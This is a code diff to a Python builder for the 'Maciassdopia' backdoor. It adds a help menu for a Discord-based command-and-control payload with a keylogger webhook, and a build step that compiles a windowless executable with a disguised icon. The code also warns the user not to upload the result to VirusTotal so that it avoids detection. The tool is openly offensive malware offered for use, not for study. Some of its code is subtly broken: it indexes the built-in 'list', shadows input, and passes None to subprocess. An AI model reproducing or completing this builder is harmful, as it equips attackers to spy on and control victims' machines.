@@ -1,5 +1,6 @@
 
 import os
+import subprocess
 from sys import platform as OS
 from prettytable import PrettyTable
 
@@ -17,12 +18,26 @@ def clear_screeen():
 clear_screeen()
 
 print('''  
-MACIASDOPIA
+$$\      $$\                     $$\                                     $$\                     $$\           
+$$$\    $$$ |                    \__|                                    $$ |                    \__|          
+$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$\  $$$$$$\   $$$$$$$\  $$$$$$$\  $$$$$$$ | $$$$$$\   $$$$$$\  $$\  $$$$$$\  
+$$\$$\$$ $$ | \____$$\ $$  _____|$$ | \____$$\ $$  _____|$$  _____|$$  __$$ |$$  __$$\ $$  __$$\ $$ | \____$$\ 
+$$ \$$$  $$ | $$$$$$$ |$$ /      $$ | $$$$$$$ |\$$$$$$\  \$$$$$$\  $$ /  $$ |$$ /  $$ |$$ /  $$ |$$ | $$$$$$$ |
+$$ |\$  /$$ |$$  __$$ |$$ |      $$ |$$  __$$ | \____$$\  \____$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$  __$$ |
+$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |\$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$ |\$$$$$$  |$$$$$$$  |$$ |\$$$$$$$ |
+\__|     \__| \_______| \_______|\__| \_______|\_______/ \_______/  \_______| \______/ $$  ____/ \__| \_______|
+                                                                                       $$ |                    
+                                                                                       $$ |                    
+                                                                                       \__|                    
 Created by Kiminod_96 and Kermitello
 Start by typing `help` \n ''')
 
 settings = ["None", "None", "None", "None", "None"]
 payload = ""
+
+def print_a(text:str):
+    """Print the text with space above and under it, for better view"""
+    print(f"\n{text}\n")
 
 def createTable(settings):
     table = PrettyTable(["Setting", "Value"])
@@ -34,7 +49,7 @@ def createTable(settings):
         table.add_row(["Channel ID", settings[3]])
         table.add_row(["Keylogger Webhook", settings[4]])
     else:
-        print("[!] Please select a payload!\n")
+        print_a("[!] Please select a payload!")
     return table
 
 try:
@@ -46,12 +61,12 @@ try:
             continue
             
         if command_list[0] == "exit":
-            print("\n[+] Exiting!")
+            print_a("[+] Exiting!")
             exit()
 
         elif command_list[0] == "use":
             if len(command_list) == 1:
-                print("[!] Please specify a payload!")
+                print_a("[!] Please specify a payload!")
             else:
                 if command_list[1] == "discord":
                     print("[+] Using Discord")
@@ -60,11 +75,11 @@ try:
                     print(f"\n{table.get_string(title='Maciassdopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 else:
-                    print("[!] Invalid payload!")
+                    print_a("[!] Invalid payload!")
 
         elif command_list[0] == "set":
             if len(command_list) < 3:
-                print("[!] Please specify a settin!\n")
+                print_a("[!] Please specify a setting!")
             else:
                 if command_list[1] == "name":
                     settings[0] = command_list[2]
@@ -79,11 +94,11 @@ try:
                     settings[3] = command_list[2]
 
                 else:
-                    print("[!] Invalid setting!")
+                    print_a("[!] Invalid setting!")
 
         elif command_list[0] == "config":
             if payload == "":
-                print("[!] Please select a payload!")
+                print_a("[!] Please select a payload!")
             else:
                 table = createTable(settings)
                 print(f"\n{table.get_string(title='Maciassdopia Backdoor Settings')}")
@@ -91,9 +106,108 @@ try:
 
         elif command_list[0] == "clear" or command_list[0] == "cls":
             clear_screeen()
-        
+
+        elif command_list[0] == "help":
+            if len(command_list) == 1:
+                print_a("""
+                        Help Menu:
+                                
+                        "help <command>" Displays more help for a specific command
+                                
+                        "use <payload>" Selects a payload to use
+                                
+                        "set <setting> <value>" Sets a value to a valid setting
+                                
+                        "config" Shows the settings and their values
+                                
+                        "build" Packages the backdoor into an EXE file
+                                
+                        "update" Gets the latest version of Maciassdopia
+                                
+                        "exit" Terminates the builder
+                        """)
+            else:
+                if command_list[1] == "use":
+                    print_a("""
+                            Help Menu:
+                                            
+                            "use <payload>" Selects a payload to use
+                                            
+                            Payloads:
+                                
+                            "discord" - A Discord based C2
+                            """)
+                elif command_list[1] == "set":
+                    if payload == "":
+                        print_a("[!] Please select a payload!")
+                    else:
+                        if payload == "discord":
+                            print_a("""
+                                    "Help Menu:
+                                                            
+                                    "set <setting> <value>" Sets a value to a valid setting
+
+                                    Settings:
+
+                                    "name" - the name of the backdoor
+                                    "guild-id" The ID of the Discord server
+                                    "bot-token" The token of the Discord bot
+                                    "channel-id" - The ID of the Discord channel
+                                    "webhook" = The webhook for the keylogger
+                                    """)
+                elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear" or command_list[1] == "cls":
+                    print_a("[!] There is nothing more to show!")
+                else:
+                    print_a("[!] Invalid command!")
+
+        elif command_list[0] == "build":
+            if payload == "":
+                print_a("[!] Select the payload first!")
+                continue
+
+            input = input("[?] Are you sure you want to build the backdoor? (y/n) ")
+            if input == "y":
+                print("[+] Building backdoor...")
+                if payload == "discord":
+                    f = open("code/discord/main.py", 'r')
+                    file = f.read()
+                    f.close()
+                    newfile = file.replace("{GUILD}", str(list[1]))
+                    newfile = newfile.replace("{TOKEN}", str(list[2]))
+                    newfile = newfile.replace("{CHANNEL}", str(list[3]))
+                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(list[4]))
+
+                f = open(settings[0] + ".py", 'w')
+                f.write(newfile)
+                f.close()
+
+                # Checking path for pyinstaller.exe
+                path_to_pyinstaller = ""
+
+                compile_command = [path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", settings[0] + ".py"]
+                
+                # linux
+                if OS == "win32":
+                    subprocess.call(compile_command)
+                else:
+                    subprocess.call(compile_command.insert(0, "wine"))
+
+                try:
+                    os.remove(settings[0] + ".py")
+                    os.remove(settings[0] + ".spec")
+                except FileNotFoundError:
+                    pass
+
+                print('\nThe Backdoor can be found inside the "dist" directory')
+                print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
+                exit()
+
+        elif command_list[0] == "update":
+            print_a("[!] Unable to update...\n[!]Function is not done yet.")
+            exit()
+
         else:
-            print("[!] Invalid command!")
+            print_a("[!] Invalid command!")
 
 except KeyboardInterrupt:
-    print("\n\n[+] Exiting")
+    print_a("[+] Exiting")
